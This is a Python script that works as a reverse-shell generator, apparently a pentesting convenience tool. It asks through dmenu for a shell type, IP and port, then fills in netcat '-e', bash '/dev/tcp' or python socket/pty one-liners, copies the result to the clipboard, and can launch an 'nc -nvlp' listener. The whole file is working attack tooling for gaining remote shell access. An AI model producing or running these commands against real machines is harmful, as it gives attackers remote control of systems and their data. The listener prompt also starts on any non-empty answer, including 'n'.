#!/usr/bin/env python3

import clipboard
import dmenu
import os

# Helper Functions
getKeys = lambda dict: \
						dict.keys()
copy = lambda text: \
						clipboard.copy(text)
buildShellCommand = lambda reverseShellTemplate, ip, port, sh: \
						reverseShellTemplates[reverseShellTemplate].replace("(ip)", ip).replace("(port)", port).replace("(sh)", sh)
buildPrompt = lambda options, prompt: \
						dmenu.show(options, prompt=prompt, lines=len(options), font="Monospace-15:normal")

reverseShellTemplates = {
	"netcat": "nc (ip) (port) -e (sh)",
	"bash": "bash -i >& /dev/tcp/(ip)/(port) 0>&1",
	"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(ip)\",(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"(sh)\")'"
}

x = buildPrompt(getKeys(reverseShellTemplates), "What type of reverse shell do you want?")
ip = buildPrompt([], "Type in your IP")
port = buildPrompt([], "Type in your PORT (ports >1024 are recommended)")

copy(buildShellCommand(x, ip, port, "/bin/sh"))
createListener = buildPrompt([], "The reverse shell command has been copied to your clipboard. Do you want me to create a listener for you?( y/n )")

if createListener:
	os.system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e nc -nvlp {port}")